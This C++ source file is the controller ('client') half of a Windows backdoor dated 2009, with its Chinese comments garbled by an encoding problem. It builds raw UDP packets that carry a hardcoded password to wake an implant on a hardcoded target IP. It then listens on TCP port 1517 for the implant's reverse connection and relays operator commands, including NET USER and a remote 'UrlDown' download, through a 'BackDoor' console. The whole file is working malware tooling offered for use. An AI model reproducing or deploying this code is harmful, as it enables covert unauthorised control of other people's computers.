//////////////////////////////////////////////////////////////////////////
//FileName:	Client	
//Data:		2009-04-06
//REM:		BackDoor�ͻ���
//////////////////////////////////////////////////////////////////////////
#include "Protocol.h"
#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <iostream>
using namespace std;
#pragma comment(lib,"WS2_32.lib")
//////////////////////////////////////////////////////////////////////////
//�궨�岿��
//////////////////////////////////////////////////////////////////////////
//Ŀ��IP��ԴIP��������������ã�ע�ⲻ������ΪαIP(���� 127.0.0.1)
#define DESTIP	"10.253.217.63"
#define SRCIP	"10.253.217.48"
//Ŀ��˿ں�Դ�˿ڿ��������裬����ԭʼUDPʱ�˿ڲ�Ӱ�졣
#define DESTPORT	1715
#define SRCPORT		1517
//�����˿�
#define SOURCEPORT	"1517"
//��������
#define PASSWORD	"BackDoor-0xQo"

#define BACKLOG	2

//////////////////////////////////////////////////////////////////////////
//������������
//////////////////////////////////////////////////////////////////////////
//����UDP�����������ŷ����
BOOL SendUdp(void);
//CHECKSUM����
int CheckSum(USHORT* buf,int size);
//UDP CHECKSUM����
void UdpCheckSum(IP_HEADER* pIphdr,UDP_HEADER* pUdphdr,char* payload,int payloadlen);
//���ſͻ����������
BOOL ClientEntry(void);


int main()
{
	HANDLE	h;

	//���������߳�
	h = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ClientEntry,NULL,NULL,NULL);
	if (h==NULL)
	{
		return -1;
	}

	//�ͻ����߳�
	h = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)SendUdp,NULL,NULL,NULL);
	if (h==NULL)
	{
		return -1;
	}

	//���߳���ѭ��
	while (TRUE)
	{
		Sleep(10000);
	}

	return 0;
}

//////////////////////////////////////////////////////////////////////////
//����UDP�����������ŷ����
//////////////////////////////////////////////////////////////////////////
BOOL SendUdp(void)
{
	WSADATA	wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	char szMsg[1024] = {0};
	memset(szMsg,0,sizeof(szMsg));
	//����������
	strcat(szMsg,PASSWORD);
	szMsg[strlen(szMsg)] = '|';
	strcat(szMsg,SRCIP);
	szMsg[strlen(szMsg)] = ':';
	strcat(szMsg,SOURCEPORT);

	int nMsgLen = strlen(szMsg);


	SOCKET	sRaw = socket(AF_INET,SOCK_RAW,IPPROTO_UDP);

	BOOL bIncl = TRUE;
	setsockopt(sRaw,IPPROTO_IP,IP_HDRINCL,(char*)&bIncl,sizeof(bIncl));

	char buf[1024] = {0};

	IP_HEADER *pIphdr = (IP_HEADER*)buf;
	pIphdr->Verlen = ( 4<<4 | sizeof(IP_HEADER)/sizeof(ULONG) );
	pIphdr->TotalLen = htons(sizeof(IP_HEADER)+sizeof(UDP_HEADER)+nMsgLen);
	pIphdr->ttl = 128;
	pIphdr->proto = IPPROTO_UDP;
	(pIphdr->SrcIp).S_un.S_addr = inet_addr(SRCIP);
	(pIphdr->DestIp).S_un.S_addr = inet_addr(DESTIP);
	pIphdr->checksum = CheckSum((USHORT*)pIphdr,sizeof(IP_HEADER));

	UDP_HEADER	*pUdphdr = (UDP_HEADER*)&buf[sizeof(IP_HEADER)];
	pUdphdr->SrcPort	= htons(SRCPORT);
	pUdphdr->DestPort = htons(DESTPORT);
	pUdphdr->Checksum = 0;

	char* pData = &buf[sizeof(IP_HEADER)+sizeof(UDP_HEADER)];
	memcpy(pData,szMsg,nMsgLen);

	UdpCheckSum(pIphdr,pUdphdr,pData,nMsgLen);

	//����Ŀ�ĵ�ַ
	SOCKADDR_IN	addr = {0};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(DESTPORT);
	addr.sin_addr.S_un.S_addr = inet_addr(DESTIP);

	//����ԭʼUDP���
	int ret;
	//Ĭ��ѭ������10��,ע����ݲ��Ի�������
	for (int i=0;i<10;i++)
	{
		Sleep(1000);

		ret = sendto(sRaw,buf,sizeof(IP_HEADER)+sizeof(UDP_HEADER)+nMsgLen,0,(sockaddr*)&addr,sizeof(addr));
		if (ret == SOCKET_ERROR)
		{
			char err[1024] = {0};
			sprintf(err,"sendto() Failed: %d\n",WSAGetLastError());
			MessageBox(NULL,err,NULL,NULL);
			return FALSE;
		}
	}
	closesocket(sRaw);
	
	//MessageBox(NULL,"Send Udp OK!",NULL,NULL);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//CheckSum����
//////////////////////////////////////////////////////////////////////////
int CheckSum(USHORT* buf,int size)
{
	ULONG	cksum = 0;
	while (size>1)
	{
		cksum += *buf++;
		size -= sizeof(USHORT);
	}

	if (size)
	{
		cksum += *buf++;
		size -= sizeof(USHORT);
	}

	cksum = (cksum>>16) + (cksum&0xFFFF);
	cksum += (cksum>>16);

	return	(USHORT)(~cksum);
}

//////////////////////////////////////////////////////////////////////////
//UDP CHECKSUM����
//////////////////////////////////////////////////////////////////////////
void UdpCheckSum(IP_HEADER* pIphdr,UDP_HEADER* pUdphdr,char* payload,int payloadlen)
{
	char	buf[1024];
	char*	pbuf = buf;
	int		chksumlen = 0;
	ULONG	zero = 0;

	memcpy(pbuf,&pIphdr->SrcIp,sizeof(pIphdr->SrcIp));
	pbuf += sizeof(pIphdr->SrcIp);
	chksumlen += sizeof(pIphdr->SrcIp);

	memcpy(pbuf,&pIphdr->DestIp,sizeof(pIphdr->DestIp));
	pbuf += sizeof(pIphdr->DestIp);
	chksumlen += sizeof(pIphdr->DestIp);

	//����8λ0��
	memcpy(pbuf,&zero,1);
	pbuf += 1;
	chksumlen += 1;

	//Э��
	memcpy(pbuf,&pIphdr->proto,sizeof(pIphdr->proto));
	pbuf += sizeof(pIphdr->proto);
	chksumlen += sizeof(pIphdr->proto);

	//UDP����
	memcpy(pbuf,&pUdphdr->Length,sizeof(pUdphdr->Length));
	pbuf += sizeof(pUdphdr->Length);
	chksumlen += sizeof(pUdphdr->Length);

	//UDPԴ�˿ں�
	memcpy(pbuf,&pUdphdr->SrcPort,sizeof(pUdphdr->SrcPort));
	pbuf += sizeof(pUdphdr->SrcPort);
	chksumlen += sizeof(pUdphdr->SrcPort);

	//UDPĿ�Ķ˿ں�
	memcpy(pbuf,&pUdphdr->DestPort,sizeof(pUdphdr->DestPort));
	pbuf += sizeof(pUdphdr->DestPort);
	chksumlen += sizeof(pUdphdr->DestPort);

	//����UDP����
	memcpy(pbuf,&pUdphdr->Length,sizeof(pUdphdr->Length));
	pbuf += sizeof(pUdphdr->Length);
	chksumlen += sizeof(pUdphdr->Length);

	//16λ��UDPУ��ͣ���0
	memcpy(pbuf,&zero,sizeof(USHORT));
	pbuf += sizeof(USHORT);
	chksumlen += sizeof(USHORT);

	//����
	memcpy(pbuf,payload,payloadlen);
	pbuf += payloadlen;
	chksumlen += payloadlen;

	//���뵽��һ��16λ�߽�
	for (int i=0;i<payloadlen%2;i++)
	{
		*pbuf = '\0';
		pbuf++;
		chksumlen++;
	}

	//����У��ͣ��������䵽UDPͷ��
	pUdphdr->Checksum = CheckSum((USHORT*)buf,chksumlen);
}


//////////////////////////////////////////////////////////////////////////
//���ſͻ����������
//////////////////////////////////////////////////////////////////////////
BOOL ClientEntry(void)
{
	WSADATA	wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	SOCKET	sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	SOCKADDR_IN	addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SRCPORT);
	addr.sin_addr.s_addr = ADDR_ANY;

	int ret = 0;
	ret = bind(sockfd,(sockaddr*)&addr,sizeof(addr));
	ret = listen(sockfd,BACKLOG);

	int size = sizeof(addr);

	SOCKET new_fd = accept(sockfd,(sockaddr*)&addr,&size);

	//���ӳɹ�ʱ��ʾ
	cout<<"     -------------------------*******************-------------------------"<<endl; 
	cout<<"     -                                                                   -"<<endl; 
	cout<<"     -                             BackDoor                              -"<<endl; 
	cout<<"     -                    CMD���  CMD + (NET USER)                    -"<<endl; 
	cout<<"     -                  SHELL���  SHELL + (UrlDown xx xx)             -"<<endl; 
	cout<<"     -                                                                   -"<<endl; 
	cout<<"     -------------------------*******************-------------------------"<<endl<<endl; 

	char recvBuf[1024*10] = {0};
	char sendBuf[1024] = {0};

	while (TRUE)
	{
		while (TRUE)
		{
			memset(recvBuf,0,sizeof(recvBuf));
			ret = recv(new_fd,recvBuf,sizeof(recvBuf),0);
			if (ret==-1)
			{
				cout<<"Socket Disconnect!\n"<<endl;
				return FALSE;
			}

			if (strcmp(recvBuf,"BackDoor\\>")==0)
			{
				cout<<recvBuf;
				break;
			}

			cout<<recvBuf<<endl;
		}
		memset(sendBuf,0,sizeof(sendBuf));
		cin.getline(sendBuf,sizeof(sendBuf),'\n');
		send(new_fd,sendBuf,strlen(sendBuf),0);
	}

	return TRUE;
}
